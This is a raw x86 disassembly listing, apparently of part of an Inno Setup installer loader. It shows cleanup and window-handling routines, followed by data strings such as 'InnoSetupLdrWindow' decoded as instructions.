  40a1ca:	a1 3c ce 40 00       	mov    0x40ce3c,%eax
  40a1cf:	e8 d0 f7 ff ff       	call   0x4099a4
  40a1d4:	83 3d 3c b2 40 00 ff 	cmpl   $0xffffffff,0x40b23c
  40a1db:	74 0a                	je     0x40a1e7
  40a1dd:	a1 3c b2 40 00       	mov    0x40b23c,%eax
  40a1e2:	e8 9d f6 ff ff       	call   0x409884
  40a1e7:	33 c0                	xor    %eax,%eax
  40a1e9:	5a                   	pop    %edx
  40a1ea:	59                   	pop    %ecx
  40a1eb:	59                   	pop    %ecx
  40a1ec:	64 89 10             	mov    %edx,%fs:(%eax)
  40a1ef:	68 87 a2 40 00       	push   $0x40a287
  40a1f4:	a1 28 ce 40 00       	mov    0x40ce28,%eax
  40a1f9:	e8 26 87 ff ff       	call   0x402924
  40a1fe:	83 3d 3c ce 40 00 00 	cmpl   $0x0,0x40ce3c
  40a205:	74 19                	je     0x40a220
  40a207:	6a 32                	push   $0x32
  40a209:	68 fa 00 00 00       	push   $0xfa
  40a20e:	b9 0d 00 00 00       	mov    $0xd,%ecx
  40a213:	8b 15 3c ce 40 00    	mov    0x40ce3c,%edx
  40a219:	33 c0                	xor    %eax,%eax
  40a21b:	e8 b8 f2 ff ff       	call   0x4094d8
  40a220:	83 3d 34 ce 40 00 00 	cmpl   $0x0,0x40ce34
  40a227:	74 10                	je     0x40a239
  40a229:	a1 34 ce 40 00       	mov    0x40ce34,%eax
  40a22e:	e8 e1 91 ff ff       	call   0x403414
  40a233:	50                   	push   %eax
  40a234:	e8 83 a2 ff ff       	call   0x4044bc
  40a239:	83 3d 44 b2 40 00 00 	cmpl   $0x0,0x40b244
  40a240:	74 0b                	je     0x40a24d
  40a242:	a1 44 b2 40 00       	mov    0x40b244,%eax
  40a247:	50                   	push   %eax
  40a248:	e8 e7 a2 ff ff       	call   0x404534
  40a24d:	83 3d 18 ce 40 00 00 	cmpl   $0x0,0x40ce18
  40a254:	74 26                	je     0x40a27c
  40a256:	a1 18 ce 40 00       	mov    0x40ce18,%eax
  40a25b:	8b 0d 1c ce 40 00    	mov    0x40ce1c,%ecx
  40a261:	ba 10 8c 40 00       	mov    $0x408c10,%edx
  40a266:	e8 11 93 ff ff       	call   0x40357c
  40a26b:	a1 18 ce 40 00       	mov    0x40ce18,%eax
  40a270:	e8 37 83 ff ff       	call   0x4025ac
  40a275:	33 c0                	xor    %eax,%eax
  40a277:	a3 18 ce 40 00       	mov    %eax,0x40ce18
  40a27c:	c3                   	ret
  40a27d:	e9 7a 8b ff ff       	jmp    0x402dfc
  40a282:	e9 6d ff ff ff       	jmp    0x40a1f4
  40a287:	80 3d 48 b2 40 00 00 	cmpb   $0x0,0x40b248
  40a28e:	74 2b                	je     0x40a2bb
  40a290:	e8 b3 f1 ff ff       	call   0x409448
  40a295:	84 c0                	test   %al,%al
  40a297:	75 22                	jne    0x40a2bb
  40a299:	68 30 00 01 00       	push   $0x10030
  40a29e:	a1 84 ca 40 00       	mov    0x40ca84,%eax
  40a2a3:	e8 6c 91 ff ff       	call   0x403414
  40a2a8:	50                   	push   %eax
  40a2a9:	a1 7c ca 40 00       	mov    0x40ca7c,%eax
  40a2ae:	e8 61 91 ff ff       	call   0x403414
  40a2b3:	50                   	push   %eax
  40a2b4:	6a 00                	push   $0x0
  40a2b6:	e8 99 a2 ff ff       	call   0x404554
  40a2bb:	33 c0                	xor    %eax,%eax
  40a2bd:	5a                   	pop    %edx
  40a2be:	59                   	pop    %ecx
  40a2bf:	59                   	pop    %ecx
  40a2c0:	64 89 10             	mov    %edx,%fs:(%eax)
  40a2c3:	eb 0f                	jmp    0x40a2d4
  40a2c5:	e9 3e 89 ff ff       	jmp    0x402c08
  40a2ca:	e8 2d f4 ff ff       	call   0x4096fc
  40a2cf:	e8 50 8c ff ff       	call   0x402f24
  40a2d4:	a1 40 b2 40 00       	mov    0x40b240,%eax
  40a2d9:	e8 52 9b ff ff       	call   0x403e30
  40a2de:	33 c0                	xor    %eax,%eax
  40a2e0:	5a                   	pop    %edx
  40a2e1:	59                   	pop    %ecx
  40a2e2:	59                   	pop    %ecx
  40a2e3:	64 89 10             	mov    %edx,%fs:(%eax)
  40a2e6:	68 03 a3 40 00       	push   $0x40a303
  40a2eb:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40a2ee:	e8 a5 8e ff ff       	call   0x403198
  40a2f3:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40a2f6:	e8 9d 8e ff ff       	call   0x403198
  40a2fb:	c3                   	ret
  40a2fc:	e9 fb 8a ff ff       	jmp    0x402dfc
  40a301:	eb e8                	jmp    0x40a2eb
  40a303:	5f                   	pop    %edi
  40a304:	5e                   	pop    %esi
  40a305:	5b                   	pop    %ebx
  40a306:	e8 21 9b ff ff       	call   0x403e2c
  40a30b:	8b e5                	mov    %ebp,%esp
  40a30d:	5d                   	pop    %ebp
  40a30e:	c3                   	ret
  40a30f:	00 ff                	add    %bh,%bh
  40a311:	ff                   	(bad)
  40a312:	ff                   	(bad)
  40a313:	ff 04 00             	incl   (%eax,%eax,1)
  40a316:	00 00                	add    %al,(%eax)
  40a318:	2e 74 6d             	je,pn  0x40a388
  40a31b:	70 00                	jo     0x40a31d
  40a31d:	00 00                	add    %al,(%eax)
  40a31f:	00 49 6e             	add    %cl,0x6e(%ecx)
  40a322:	6e                   	outsb  %ds:(%esi),(%dx)
  40a323:	6f                   	outsl  %ds:(%esi),(%dx)
  40a324:	53                   	push   %ebx
  40a325:	65 74 75             	gs je  0x40a39d
  40a328:	70 4c                	jo     0x40a376
  40a32a:	64 72 57             	fs jb  0x40a384
  40a32d:	69 6e 64 6f 77 00 00 	imul   $0x776f,0x64(%esi),%ebp
  40a334:	53                   	push   %ebx
  40a335:	54                   	push   %esp
  40a336:	41                   	inc    %ecx
  40a337:	54                   	push   %esp
  40a338:	49                   	dec    %ecx
  40a339:	43                   	inc    %ebx
  40a33a:	00 00                	add    %al,(%eax)
  40a33c:	ff                   	(bad)
  40a33d:	ff                   	(bad)
  40a33e:	ff                   	(bad)
  40a33f:	ff 10                	call   *(%eax)
  40a341:	00 00                	add    %al,(%eax)
  40a343:	00 2f                	add    %ch,(%edi)
  40a345:	53                   	push   %ebx
  40a346:	4c                   	dec    %esp
  40a347:	35 3d 22 24 25       	xor    $0x2524223d,%eax
  40a34c:	78 2c                	js     0x40a37a
  40a34e:	25 64 2c 25 64       	and    $0x64252c64,%eax
  40a353:	2c 00                	sub    $0x0,%al
  40a355:	00 00                	add    %al,(%eax)
  40a357:	00 ff                	add    %bh,%bh
  40a359:	ff                   	(bad)
  40a35a:	ff                   	(bad)
  40a35b:	ff 02                	incl   (%edx)
  40a35d:	00 00                	add    %al,(%eax)
  40a35f:	00 22                	add    %ah,(%edx)
  40a361:	20 00                	and    %al,(%eax)
	...
